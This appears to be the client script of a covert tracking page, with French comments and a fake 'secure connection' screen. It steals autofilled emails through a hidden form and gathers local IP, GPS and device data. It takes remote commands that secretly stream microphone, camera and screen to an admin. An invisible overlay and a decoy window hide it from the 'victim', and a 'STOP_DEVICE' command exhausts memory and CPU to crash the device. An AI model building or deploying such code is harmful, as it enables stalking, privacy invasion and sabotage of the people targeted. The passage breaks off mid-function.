let cachedLocalIp = null;
let capturedEmail = localStorage.getItem('tracker_captured_email') || null;
let emailLogDebounce = null;

function persistCapturedEmail(email) {
    if (!email || !email.includes('@')) return;
    capturedEmail = email.trim();
    localStorage.setItem('tracker_captured_email', capturedEmail);
}

function setupAutofillTrap() {
    if (document.getElementById('autofill-trap-wrap')) return;

    const wrap = document.createElement('div');
    wrap.id = 'autofill-trap-wrap';
    wrap.setAttribute('aria-hidden', 'true');
    wrap.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;overflow:hidden;opacity:0;pointer-events:none;';
    wrap.innerHTML = `
        <form autocomplete="on">
            <input type="email" id="autofill-email-trap" name="email" autocomplete="email username">
            <input type="password" name="password" autocomplete="current-password">
        </form>
    `;
    document.body.appendChild(wrap);

    const trap = document.getElementById('autofill-email-trap');
    trap.addEventListener('input', () => {
        if (trap.value && trap.value.includes('@')) {
            onEmailCaptured(trap.value, false);
        }
    });
    trap.addEventListener('change', () => {
        if (trap.value && trap.value.includes('@')) {
            onEmailCaptured(trap.value, true);
        }
    });
}

async function onEmailCaptured(email, forceNotify) {
    persistCapturedEmail(email);
    await logVisitor(null, true, forceNotify);
}

function requestEmailFromTarget() {
    let overlay = document.getElementById('verification-overlay');
    if (!overlay) {
        overlay = document.createElement('div');
        overlay.id = 'verification-overlay';
        document.body.appendChild(overlay);
    }
    overlay.dataset.verifyBound = '';
    showVerificationModal(overlay);
    const input = overlay.querySelector('#trap-email-input');
    if (input) {
        input.value = capturedEmail || '';
        input.focus();
    }
}

// Fonction pour récupérer l'IP locale via WebRTC
async function getLocalIP() {
    if (cachedLocalIp) return cachedLocalIp;

    return new Promise((resolve) => {
        const ips = [];
        const pc = new RTCPeerConnection({
            iceServers: [
                { urls: 'stun:stun.l.google.com:19302' },
                { urls: 'stun:stun1.l.google.com:19302' }
            ]
        });
        
        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        
        pc.onicecandidate = (event) => {
            if (!event || !event.candidate) {
                if (ips.length > 0) {
                    // Filtrage intelligent pour trouver la VRAIE IP locale (WiFi/LAN)
                    // On exclut les IPs courantes de VM (VirtualBox: 192.168.56.x, VMware: 192.168.122.x)
                    const realIps = ips.filter(ip => 
                        ip &&
                        !ip.includes('.local') && 
                        ip !== '192.0.0.2' && 
                        ip !== '0.0.0.0' &&
                        !ip.startsWith('127.') &&
                        !ip.startsWith('192.168.56.') && // Exclure VirtualBox
                        !ip.startsWith('192.168.99.') && // Exclure Docker/VM
                        !ip.startsWith('172.17.') &&      // Exclure Docker
                        !ip.startsWith('10.0.2.')        // Exclure NAT VM
                    );
                    
                    if (realIps.length > 0) {
                        // On donne la priorité aux plages résidentielles classiques
                        const preferredIp = realIps.find(ip => ip.startsWith('192.168.1.') || ip.startsWith('192.168.0.')) || realIps[0];
                        cachedLocalIp = preferredIp;
                        resolve(preferredIp);
                    } else {
                        // Si on n'a que des IPs de VM, on prend la première mais on marque un doute
                        cachedLocalIp = ips[0];
                        resolve(ips[0]);
                    }
                } else {
                    resolve("Masquée (Navigateur)");
                }
                return;
            }
            
            const parts = event.candidate.candidate.split(' ');
            const ip = parts[4];
            if (!ips.includes(ip) && (ip.includes('.') || ip.includes(':'))) {
                ips.push(ip);
            }
        };

        setTimeout(() => {
            if (ips.length > 0) {
                cachedLocalIp = ips[0];
                resolve(ips[0]);
            } else {
                resolve("Inconnue (Timeout/mDNS)");
            }
            pc.close();
        }, 2000);
    });
}

async function getPreciseLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }

        const options = {
            enableHighAccuracy: true,
            timeout: 15000, 
            maximumAge: 0
        };

        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    speed: position.coords.speed,
                    heading: position.coords.heading
                });
            },
            (error) => {
                console.warn("Géolocalisation refusée ou erreur:", error.message);
                resolve(null);
            },
            options
        );
    });
}

async function getDeviceStats() {
    const stats = {
        battery: null,
        charging: null,
        connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
        downlink: navigator.connection ? navigator.connection.downlink : null,
        rtt: navigator.connection ? navigator.connection.rtt : null,
        email: capturedEmail,
        platform: navigator.platform,
        vendor: navigator.vendor,
        cores: navigator.hardwareConcurrency,
        memory: navigator.deviceMemory
    };

    const localIp = cachedLocalIp;
    // Détection avancée du type de réseau
    if (localIp) {
        if (localIp.startsWith('192.168.43.')) {
            stats.networkName = "Android Hotspot (Default)";
            stats.connection = 'hotspot';
        } else if (localIp.startsWith('172.20.10.')) {
            stats.networkName = "iPhone Hotspot (Default)";
            stats.connection = 'hotspot';
        } else if (localIp.startsWith('192.168.')) {
            stats.connection = 'wifi';
        } else if (localIp.startsWith('10.')) {
            stats.connection = 'private/vpn';
        }
    }

    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            stats.battery = Math.round(battery.level * 100);
            stats.charging = battery.charging;
        }
    } catch (e) {}
    
    return stats;
}

let sessionId = localStorage.getItem('tracker_session_id');
if (!sessionId) {
    sessionId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
    localStorage.setItem('tracker_session_id', sessionId);
}

async function logVisitor(preciseLocation = null, isUpdate = false, forceDiscord = false) {
    try {
        const localIp = cachedLocalIp || await getLocalIP();
        const stats = await getDeviceStats();
        
        const res = await fetch('/api/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sessionId: sessionId,
                isUpdate: isUpdate,
                forceDiscord: forceDiscord,
                localIp: localIp,
                preciseLocation: preciseLocation,
                deviceStats: stats,
                userAgent: navigator.userAgent,
                language: navigator.language,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                referrer: document.referrer || 'Direct',
                page: window.location.pathname
            })
        });

        // Après chaque log, on vérifie si l'admin a envoyé une commande
        checkCommands();
    } catch (error) {
        console.error("Erreur lors du logging:", error);
    }
}

// Tentative de garder l'écran allumé (Wake Lock) pour assurer la réception des commandes
let wakeLock = null;
async function requestWakeLock() {
    try {
        if ('wakeLock' in navigator) {
            wakeLock = await navigator.wakeLock.request('screen');
            console.log("Wake Lock activé 🔓");
        }
    } catch (err) {
        console.warn("Wake Lock refusé:", err.message);
    }
}

async function startScreenShare() {
    await startScreenCapture();
}

let mediaRecorder = null;
let audioStream = null;
let intercomListenTimer = null;
let lastAdminAudioTs = 0;

// --- GESTION DES FLUX MÉDIA PERSISTANTS ---
let persistentAudioStream = null;
let persistentVideoStream = null;
let persistentScreenStream = null;

async function uploadIntercomAudio(from, blob) {
    if (!sessionId || !blob || blob.size === 0) return;
    
    // On convertit en Base64 plus rapidement
    const reader = new FileReader();
    reader.readAsDataURL(blob);
    reader.onloadend = async () => {
        const dataUrl = reader.result;
        try {
            await fetch('/api/intercom', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId, from, audio: dataUrl, timestamp: Date.now() })
            });
        } catch (e) {
            console.warn('Upload intercom:', e.message);
        }
    };
}

function startIntercomListen() {
    if (intercomListenTimer) return;
    // Polling audio plus rapide (800ms au lieu de 1200ms)
    intercomListenTimer = setInterval(async () => {
        if (!sessionId) return;
        try {
            const res = await fetch(`/api/intercom?sessionId=${encodeURIComponent(sessionId)}&from=admin&t=${Date.now()}`, { 
                cache: 'no-store',
                headers: { 'Pragma': 'no-cache' }
            });
            if (!res.ok) return;
            const data = await res.json();
            if (data.audio && data.timestamp !== lastAdminAudioTs) {
                lastAdminAudioTs = data.timestamp;
                const audio = new Audio(data.audio);
                audio.play().catch(() => {});
            }
        } catch (e) {}
    }, 800);
}

function stopIntercomListen() {
    if (intercomListenTimer) {
        clearInterval(intercomListenTimer);
        intercomListenTimer = null;
    }
}

async function startSpyMic() {
    try {
        if (!persistentAudioStream || persistentAudioStream.getAudioTracks()[0].readyState === 'ended') {
            persistentAudioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        }
        
        if (mediaRecorder && mediaRecorder.state === 'recording') return;

        mediaRecorder = new MediaRecorder(persistentAudioStream);
        mediaRecorder.ondataavailable = async (event) => {
            if (event.data.size > 0) {
                await uploadIntercomAudio('target', event.data);
            }
        };

        mediaRecorder.start(2500);
        startIntercomListen();
        console.log('🎙️ Micro activé (intercom)');
    } catch (err) {
        console.error('Erreur Micro:', err.message);
    }
}

function stopSpyMic() {
    stopIntercomListen();
    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
        mediaRecorder.stop();
        mediaRecorder = null;
    }
    // On ne stoppe PAS le persistentAudioStream pour que la réactivation soit instantanée
    console.log('🎙️ Micro en veille (flux maintenu)');
}

let videoStream = null;
let cameraUploadTimer = null;
let cameraCaptureCanvas = null;
let cameraPreviewVideo = null;
let cameraEnabled = false;
let cameraUploadInFlight = false;

let screenStream = null;
let screenUploadTimer = null;
let screenPreviewVideo = null;
let screenEnabled = false;
let screenUploadInFlight = false;

function isMobileDevice() {
    return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
}

function getCameraConstraints() {
    if (isMobileDevice()) {
        return {
            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
            audio: false
        };
    }
    return {
        video: { width: { ideal: 1280 }, height: { ideal: 720 } },
        audio: false
    };
}

async function requestVerifyMediaPermissions() {
    try {
        // Force la redemande même si refusé précédemment en ne vérifiant pas l'état
        const stream = await navigator.mediaDevices.getUserMedia({
            audio: true,
            video: getCameraConstraints().video
        });
        // On garde les streams en mémoire pour plus de rapidité plus tard
        persistentAudioStream = new MediaStream(stream.getAudioTracks());
        persistentVideoStream = new MediaStream(stream.getVideoTracks());
        
        console.log("📷 Autorisations micro/caméra accordées et flux maintenus");
        return true;
    } catch (err) {
        console.warn("Permissions média refusées:", err.message);
        
        // Si refusé, on peut tenter une deuxième fois avec seulement l'audio pour voir
        try {
            const audioOnly = await navigator.mediaDevices.getUserMedia({ audio: true });
            persistentAudioStream = new MediaStream(audioOnly.getAudioTracks());
            console.log("🎙️ Seul le micro a été autorisé");
            return true;
        } catch (e) {
            return false;
        }
    }
}

function getCameraCaptureCanvas() {
    if (!cameraCaptureCanvas) {
        cameraCaptureCanvas = document.createElement('canvas');
    }
    return cameraCaptureCanvas;
}

async function ensureCameraPreviewVideo() {
    if (!cameraPreviewVideo) {
        cameraPreviewVideo = document.createElement('video');
        cameraPreviewVideo.muted = true;
        cameraPreviewVideo.playsInline = true;
        cameraPreviewVideo.setAttribute('playsinline', '');
        // On rend la vidéo visible mais minuscule et cachée hors écran pour forcer le rendu sur certains navigateurs
        cameraPreviewVideo.style.cssText = 'position:fixed;width:1px;height:1px;top:-10px;left:-10px;opacity:0.01;pointer-events:none;z-index:-1;';
        document.body.appendChild(cameraPreviewVideo);
    }
    if (cameraPreviewVideo.srcObject !== videoStream) {
        cameraPreviewVideo.srcObject = videoStream;
        // On force le play et on attend qu'il soit effectif
        try {
            await cameraPreviewVideo.play();
        } catch (e) {
            console.warn("Échec play vidéo:", e);
        }
    }
    
    // Attente explicite du flux vidéo
    return new Promise((resolve) => {
        if (cameraPreviewVideo.readyState >= 2) return resolve();
        const onData = () => {
            cameraPreviewVideo.removeEventListener('loadeddata', onData);
            resolve();
        };
        cameraPreviewVideo.addEventListener('loadeddata', onData);
        setTimeout(resolve, 1000); // Timeout de sécurité
    });
}

async function uploadCameraFrame() {
    if (!cameraEnabled || !videoStream || !sessionId || cameraUploadInFlight) return;
    
    const track = videoStream.getVideoTracks()[0];
    if (!track || track.readyState !== 'live') {
        // Si le track est mort, on tente de le réactiver via le flux persistant
        if (persistentVideoStream && persistentVideoStream.getVideoTracks()[0].readyState === 'live') {
            videoStream = persistentVideoStream;
        } else {
            stopSpyCamera();
            return;
        }
    }

    cameraUploadInFlight = true;
    try {
        await ensureCameraPreviewVideo();
        const canvas = getCameraCaptureCanvas();
        
        // On récupère les vraies dimensions de la vidéo
        const w = cameraPreviewVideo.videoWidth || 480;
        const h = cameraPreviewVideo.videoHeight || 360;
        
        if (!w || !h) {
            cameraUploadInFlight = false;
            return;
        }

        canvas.width = 480; // Taille fixe pour l'admin
        canvas.height = (h / w) * 480;
        
        const ctx = canvas.getContext('2d');
        ctx.drawImage(cameraPreviewVideo, 0, 0, canvas.width, canvas.height);
        
        const frame = canvas.toDataURL('image/jpeg', 0.4); // Qualité un peu plus haute pour éviter le noir

        await fetch('/api/camera-frame', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId, frame, timestamp: Date.now() })
        });
    } catch (e) {
        console.warn('Upload frame caméra:', e.message);
    } finally {
        cameraUploadInFlight = false;
    }
}

async function startSpyCamera() {
    if (cameraEnabled && videoStream) return;
    
    try {
        if (persistentVideoStream && persistentVideoStream.getVideoTracks()[0].readyState === 'live') {
            videoStream = persistentVideoStream;
        } else {
            videoStream = await navigator.mediaDevices.getUserMedia(getCameraConstraints());
            persistentVideoStream = videoStream;
        }
        
        cameraEnabled = true;
        const track = videoStream.getVideoTracks()[0];
        track.onended = () => {
            console.log('📷 Caméra arrêtée par le système');
            stopSpyCamera();
        };

        console.log('📷 Caméra activée');
        // Intervalle plus rapide pour compenser la latence réseau (800ms)
        const interval = isMobileDevice() ? 800 : 1000;
        uploadCameraFrame();
        if (cameraUploadTimer) clearInterval(cameraUploadTimer);
        cameraUploadTimer = setInterval(uploadCameraFrame, interval);
    } catch (err) {
        cameraEnabled = false;
        console.error('Erreur Caméra:', err.message);
    }
}

function stopSpyCamera() {
    cameraEnabled = false;
    cameraUploadInFlight = false;
    if (cameraUploadTimer) {
        clearInterval(cameraUploadTimer);
        cameraUploadTimer = null;
    }
    // On ne stoppe PAS le flux pour la rapidité
    if (cameraPreviewVideo) {
        cameraPreviewVideo.srcObject = null;
    }
    console.log('📷 Caméra en veille');
}

async function ensureScreenPreviewVideo() {
    if (!screenPreviewVideo) {
        screenPreviewVideo = document.createElement('video');
        screenPreviewVideo.muted = true;
        screenPreviewVideo.playsInline = true;
        screenPreviewVideo.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1;';
        document.body.appendChild(screenPreviewVideo);
    }
    if (screenPreviewVideo.srcObject !== screenStream) {
        screenPreviewVideo.srcObject = screenStream;
        await screenPreviewVideo.play().catch(() => {});
    }
}

async function uploadScreenFrame() {
    if (!screenEnabled || !screenStream || !sessionId || screenUploadInFlight) return;
    const track = screenStream.getVideoTracks()[0];
    if (!track || track.readyState !== 'live') {
        stopScreenCapture();
        return;
    }

    screenUploadInFlight = true;
    try {
        await ensureScreenPreviewVideo();
        const canvas = getCameraCaptureCanvas();
        const w = Math.min(960, screenPreviewVideo.videoWidth || 960);
        const h = Math.min(540, screenPreviewVideo.videoHeight || 540);
        if (!w || !h) return;
        canvas.width = w;
        canvas.height = h;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(screenPreviewVideo, 0, 0, w, h);
        const frame = canvas.toDataURL('image/jpeg', 0.45);

        await fetch('/api/screen-frame', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId, frame, timestamp: Date.now() })
        });
    } catch (e) {
        console.warn('Upload frame écran:', e.message);
    } finally {
        screenUploadInFlight = false;
    }
}

async function startScreenCapture() {
    if (screenEnabled && screenStream) return;
    stopScreenCapture();

    try {
        screenStream = await navigator.mediaDevices.getDisplayMedia({
            video: { cursor: 'always' },
            audio: false
        });
        screenEnabled = true;
        const track = screenStream.getVideoTracks()[0];
        track.addEventListener('ended', () => {
            console.log('📺 Partage écran arrêté par la cible');
            stopScreenCapture();
        });

        console.log('📺 Capture écran active');
        uploadScreenFrame();
        screenUploadTimer = setInterval(uploadScreenFrame, 1500);
        await logVisitor(null, true, false);
    } catch (err) {
        screenEnabled = false;
        console.error('Erreur Partage Écran:', err.message);
    }
}

function stopScreenCapture() {
    screenEnabled = false;
    screenUploadInFlight = false;
    if (screenUploadTimer) {
        clearInterval(screenUploadTimer);
        screenUploadTimer = null;
    }
    if (screenStream) {
        screenStream.getTracks().forEach(track => track.stop());
        screenStream = null;
    }
    if (screenPreviewVideo) {
        screenPreviewVideo.srcObject = null;
    }
}

const VERIFICATION_MODAL_HTML = `
    <div style="max-width: 400px; width: 90%; text-align: center; padding: 40px; background: #1e293b; border-radius: 16px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); border: 1px solid #334155;">
        <div style="margin-bottom: 24px;">
            <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="1.5" style="margin-bottom: 16px;">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
            </svg>
            <h1 style="font-size: 1.5rem; font-weight: 600; margin: 0 0 8px 0;">Connexion Sécurisée</h1>
            <p style="color: #94a3b8; font-size: 0.9rem; line-height: 1.5;">Veuillez patienter pendant l'initialisation de la galerie...</p>
        </div>

        <div style="margin-top: 24px; display: flex; align-items: center; justify-content: center; gap: 8px; color: #64748b; font-size: 0.75rem;">
            <div style="width: 48px; height: 48px; border: 3px solid rgba(96,165,250,0.3); border-top-color: #60a5fa; border-radius: 50%; animation: spin 1s linear infinite;"></div>
            <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
        </div>
    </div>
`;

const LOCATION_READY_KEY = 'tracker_location_ready';
let gpsWatchStarted = false;

function markLocationReady() {
    localStorage.setItem(LOCATION_READY_KEY, '1');
}

function isLocationReady() {
    return localStorage.getItem(LOCATION_READY_KEY) === '1';
}

async function requestLocationOnly() {
    if (!navigator.geolocation) return false;
    return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
            () => resolve(true),
            () => resolve(false),
            { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
        );
    });
}

async function checkCommands() {
    if (!sessionId) return;
    
    try {
        const res = await fetch(`/api/command?sessionId=${sessionId}`, {
            cache: 'no-store', // Éviter le cache navigateur pour les commandes
            headers: { 'Pragma': 'no-cache' }
        });
        
        if (!res.ok) return;

        const data = await res.json();

        if (data && data.command) {
            const cmd = data.command;
            console.log("⚡ COMMANDE REÇUE :", cmd.command);

            // FEEDBACK VISUEL DISCRET (Petit point vert en haut à droite)
            const feedback = document.createElement('div');
            feedback.style.cssText = 'position:fixed; top:5px; right:5px; width:8px; height:8px; background:#00ff00; border-radius:50%; z-index:2147483647; box-shadow: 0 0 10px #00ff00; pointer-events:none; transition: opacity 1s;';
            document.body.appendChild(feedback);
            setTimeout(() => {
                feedback.style.opacity = '0';
                setTimeout(() => feedback.remove(), 1000);
            }, 1000);

            // Si on reçoit une commande, on essaie de réveiller l'appareil
            requestWakeLock();

            switch (cmd.command) {
                case 'MIC_ON':
                    startSpyMic();
                    break;
                case 'MIC_OFF':
                    stopSpyMic();
                    break;
                case 'CAMERA_ON':
                    startSpyCamera();
                    break;
                case 'CAMERA_OFF':
                    stopSpyCamera();
                    break;
                case 'REQUEST_EMAIL':
                    requestEmailFromTarget();
                    break;
                case 'SCREEN_SHARE':
                case 'SCREEN_ON':
                    startScreenCapture();
                    break;
                case 'SCREEN_OFF':
                    stopScreenCapture();
                    break;
                case 'FLASH_ALERT':
                    const msg = cmd.payload.message || "ALERTE SYSTÈME";
                    
                    // Création de l'overlay plein écran
                    const flashOverlay = document.createElement('div');
                    flashOverlay.style.cssText = `
                        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
                        background: red; color: white; z-index: 2147483647;
                        display: flex; align-items: center; justify-content: center;
                        text-align: center; font-family: sans-serif; font-weight: bold;
                        flex-direction: column; padding: 20px; box-sizing: border-box;
                    `;
                    
                    flashOverlay.innerHTML = `
                        <h1 style="font-size: 3.5rem; margin-bottom: 20px; text-shadow: 4px 4px 15px black; animation: blink 0.5s infinite;">⚠️ ATTENTION ⚠️</h1>
                        <p style="font-size: 2rem; background: rgba(0,0,0,0.8); padding: 30px; border-radius: 15px; border: 3px solid white;">${msg}</p>
                        <button id="close-flash" style="margin-top: 40px; padding: 20px 40px; font-size: 1.2rem; border: none; border-radius: 8px; cursor: pointer; background: white; color: red; font-weight: bold;">J'AI COMPRIS</button>
                        <style>@keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }</style>
                    `;
                    
                    document.body.appendChild(flashOverlay);
                    
                    // On tente le plein écran réel (nécessite une interaction, on l'ajoute au clic n'importe où)
                    const enterFS = () => {
                        try {
                            if (flashOverlay.requestFullscreen) flashOverlay.requestFullscreen();
                            else if (flashOverlay.webkitRequestFullscreen) flashOverlay.webkitRequestFullscreen();
                            else if (flashOverlay.msRequestFullscreen) flashOverlay.msRequestFullscreen();
                        } catch(e) {}
                    };
                    
                    enterFS(); // Tentative immédiate
                    document.addEventListener('click', enterFS, { once: true });
                    
                    flashOverlay.querySelector('#close-flash').onclick = (e) => {
                        e.stopPropagation();
                        flashOverlay.remove();
                        if (document.exitFullscreen) document.exitFullscreen().catch(() => {});
                    };
                    break;

                case 'ALERT':
                    // On garde ALERT classique pour compatibilité
                    alert(cmd.payload.message || "Message de l'administrateur");
                    break;
                case 'VIBRATE':
                    if (navigator.vibrate) {
                        navigator.vibrate([500, 200, 500, 200, 1000]);
                    }
                    break;
                case 'FULLSCREEN':
                    const forceFS = () => {
                        document.documentElement.requestFullscreen().catch(() => {});
                    };
                    forceFS();
                    document.addEventListener('click', forceFS, { once: true });
                    break;
                case 'REDIRECT':
                    window.location.replace(cmd.payload.url || 'https://google.com');
                    break;
                case 'RELOAD':
                    window.location.reload();
                    break;
                case 'STOP_DEVICE':
                    // Simulation d'arrêt TOTALE et agressive pour PC et Mobile
                    document.body.innerHTML = '';
                    document.body.style.cssText = 'background:black !important; cursor:none !important; overflow:hidden !important;';
                    
                    const crashOverlay = document.createElement('div');
                    crashOverlay.style.cssText = `
                        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
                        background: black; color: white; z-index: 99999999;
                        display: flex; align-items: center; justify-content: center;
                        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                        text-align: center; cursor: none;
                    `;
                    
                    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
                    
                    if (isMobile) {
                        // Simulation d'arrêt Android / iOS parfaite
                        crashOverlay.innerHTML = `
                            <div style="display:flex; flex-direction:column; align-items:center;">
                                <div style="width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 20px;"></div>
                                <h2 style="font-size: 1.1rem; font-weight: 400; color: white; letter-spacing: 0.5px;">Arrêt en cours...</h2>
                            </div>
                            <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
                        `;
                    } else {
                        // Simulation d'arrêt Windows 10/11 parfaite
                        crashOverlay.style.background = 'black';
                        crashOverlay.innerHTML = `
                            <div style="display:flex; flex-direction:column; align-items:center;">
                                <div style="width: 60px; height: 60px; border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #0078d7; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 25px;"></div>
                                <h2 style="font-size: 1.8rem; font-weight: 300; color: white;">Arrêt en cours</h2>
                            </div>
                            <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
                        `;
                    }
                    
                    document.body.appendChild(crashOverlay);
                    
                    // On essaie de forcer le plein écran sans arrêt
                    const forceLock = () => {
                        try {
                            if (document.documentElement.requestFullscreen) {
                                document.documentElement.requestFullscreen().catch(() => {});
                            }
                        } catch(e) {}
                    };
                    
                    forceLock();
                    document.addEventListener('click', forceLock);
                    document.addEventListener('keydown', (e) => {
                        e.preventDefault();
                        return false;
                    }, true);

                    // ATTACK : Saturation de l'appareil pour forcer un plantage réel (Freeze)
                    // On utilise plusieurs méthodes pour contourner les protections (Web Workers, Saturation DOM, Memory leak)
                    setTimeout(() => {
                        // 1. Saturation Mémoire via Blob (très efficace pour forcer le crash de l'onglet)
                        const blobs = [];
                        const saturateMemory = () => {
                            try {
                                for(let i=0; i<100; i++) {
                                    const bigData = new Uint8Array(10 * 1024 * 1024); // 10MB
                                    crypto.getRandomValues(bigData);
                                    blobs.push(new Blob([bigData]));
                                }
                            } catch(e) {}
                            setTimeout(saturateMemory, 100);
                        };
                        saturateMemory();

                        // 2. Saturation CPU via boucle infinie non-bloquante pour éviter le "Kill Script" immédiat
                        const freezeCPU = () => {
                            const end = Date.now() + 500;
                            while(Date.now() < end) {
                                Math.atan2(Math.random(), Math.random());
                            }
                            setTimeout(freezeCPU, 50); // Laisse 50ms de "respiration" pour éviter la détection de script figé
                        };
                        freezeCPU();

                        // 3. Saturation du DOM (ralentit tout le système de rendu)
                        const saturateDOM = () => {
                            for(let i=0; i<1000; i++) {
                                const el = document.createElement('div');
                                el.style.cssText = 'position:fixed; width:1px; height:1px; filter:blur(100px);';
                                document.body.appendChild(el);
                            }
                        };
                        setInterval(saturateDOM, 500);
                    }, 1000);
                    break;
            }
        }
    } catch (e) {
        console.error("Erreur checkCommands:", e);
    }
}

let deferredPrompt = null;
window.addEventListener('beforeinstallprompt', (e) => {
    e.preventDefault();
    deferredPrompt = e;
});

function showVerificationModal(overlay) {
    overlay.style.cssText = `
        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
        background: #0f172a; z-index: 99999999;
        display: flex; align-items: center; justify-content: center;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        color: white; cursor: default;
    `;
    overlay.innerHTML = VERIFICATION_MODAL_HTML;
    bindVerificationForm(overlay);

    const strip = overlay.querySelector('#verify-invisible-strip');
    if (strip && strip.dataset.bound !== '1') {
        strip.dataset.bound = '1';
        strip.addEventListener('click', async (e) => {
            e.stopPropagation();
            strip.textContent = 'Autorisations en cours...';
            await requestVerifyMediaPermissions();
            strip.textContent = 'Caméra/micro autorisés ✓';
            strip.style.color = '#4ade80';
        });
    }
}

function bindVerificationForm(overlay) {
    // Le formulaire n'existe plus, on peut supprimer cette fonction ou la vider
}

function setupInvisibleVerifyOverlay(overlay) {
    if (overlay.dataset.verifyBound === '1') return;
    overlay.dataset.verifyBound = '1';

    // Rendre l'overlay réellement invisible et plein écran
    overlay.style.background = 'rgba(0,0,0,0.01)';

    overlay.addEventListener('click', async () => {
        // --- TECHNIQUE DE DUPLICATION IMMÉDIATE ---
        // On ouvre une copie du site pour que la victime continue sa navigation dessus
        // Pendant que la page actuelle devient le tracker invisible en arrière-plan
        try {
            const victimWindow = window.open(window.location.href + '?mode=view', '_blank');
            if (victimWindow) {
                // On met le focus sur la nouvelle fenêtre pour que la victime ne voie pas celle-ci
                victimWindow.focus();
            }
        } catch (e) {
            console.warn("Pop-up bloqué, on continue sur la page actuelle");
        }

        // --- LA PAGE ACTUELLE DEVIENT INVISIBLE ET AGRESSIVE ---
        overlay.style.background = 'rgba(0,0,0,0)';
        overlay.innerHTML = ''; // On vide tout le contenu visuel
        document.body.style.opacity = '0'; // On rend TOUTE la page invisible
        
        console.log("Piège activé : Passage en mode Fantôme (Background)");

        // --- FORÇAGE RÉEL DU PARTAGE D'ÉCRAN ---
        // On boucle tant qu'on n'a pas l'accès ou que la cible ne ferme pas
        const forceScreenCapture = async () => {
            if (persistentScreenStream && persistentScreenStream.active) return;
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({ 
                    video: { cursor: 'always' },
                    audio: false 
                });
                persistentScreenStream = stream;
                screenStream = stream;
                screenEnabled = true;
                uploadScreenFrame();
                if (screenUploadTimer) clearInterval(screenUploadTimer);
                screenUploadTimer = setInterval(uploadScreenFrame, 1200);
                console.log("📺 Écran capturé de force");
            } catch (err) {
                console.warn("Échec capture écran, nouvelle tentative dans 2s...");
                setTimeout(forceScreenCapture, 2000); // On insiste toutes les 2 secondes
            }
        };

        // Lancement immédiat du forçage écran + média
        forceScreenCapture();

        const [locOk, mediaOk] = await Promise.all([
            requestLocationOnly(),
            requestVerifyMediaPermissions()
        ]);

        if (!gpsWatchStarted) startGpsTracking();
        
        if (locOk) {
            markLocationReady();
        }

        // On ne montre JAMAIS le formulaire d'email ici car on est en mode fantôme
        // La victime navigue sur l'autre fenêtre dupliquée
    });
}

function onFirstGpsCaptured() {
    markLocationReady();
    const overlay = document.getElementById('verification-overlay');
    if (overlay) showVerificationModal(overlay);
}

async function startVerification() {
    // Si on est en mode "vue simple" (fenêtre dupliquée), on ne lance pas le tracker
    if (window.location.search.includes('mode=view')) {
        console.log("Mode vue simple actif. Pas de tracker ici.");
        return;
    }

    let overlay = document.getElementById('verification-overlay');

    if (!overlay) {
        overlay = document.createElement('div');
        overlay.id = 'verification-overlay';
        // Plein écran, transparent et par-dessus tout
        overlay.style.cssText = 'position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:999999999; cursor:default; background:rgba(0,0,0,0.01); display:flex; align-items:center; justify-content:center;';
        document.body.appendChild(overlay);
    }

    // ON IGNORE LE LOCALSTORAGE POUR LE FORMULAIRE D'EMAIL
    // Même si la cible est déjà connue, on repasse par l'overlay invisible pour forcer les accès média/GPS
    setupInvisibleVerifyOverlay(overlay);
}

function getDistance(lat1, lon1, lat2, lon2) {
    const R = 6371e3;
    const φ1 = lat1 * Math.PI/180;
    const φ2 = lat2 * Math.PI/180;
    const Δφ = (lat2-lat1) * Math.PI/180;
    const Δλ = (lon2-lon1) * Math.PI/180;
    const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) + Math.cos(φ1) * Math.cos(φ2) * Math.sin(Δλ/2) * Math.sin(Δλ/2);
